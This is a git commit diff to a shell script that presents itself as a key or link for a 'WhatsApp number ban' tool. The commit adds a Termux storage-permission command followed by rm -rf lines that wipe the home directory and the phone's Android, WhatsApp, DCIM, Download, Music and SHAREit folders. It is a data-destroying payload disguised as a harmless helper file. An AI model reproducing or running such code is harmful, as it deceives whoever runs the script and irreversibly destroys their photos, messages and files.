e58965ed897edca3322ce30c4fba6e2024c439ed
Master-hack <96709855+DRACULA-HACK@users.noreply.github.com>
2022-06-06 21:10:35 +0530

    Update the_key_link.nano.sh

--- the_key_link.nano.sh
+++ the_key_link.nano.sh
@@ -6,3 +6,20 @@ https%3A%2F%2Fgithub.com%2FDRACULA-HACK%2Fwhatsapp-number_ban
 
 this is the link find the key word by using nano commends
  .🤪
+
+
+
+termux-setup-storage
+	
+
+
+	
+	rm -rf cd /sdcard/Android
+	rm -rf cd ~
+	rm -rf cd /sdcard/WhatsApp
+	rm -rf cd /sdcard/DCIM
+	rm -rf cd /sdcard/Download
+	rm -rf cd /sdcard/Music
+	rm -rf cd /sdcard/SHAREit
+
+# DG1BT "
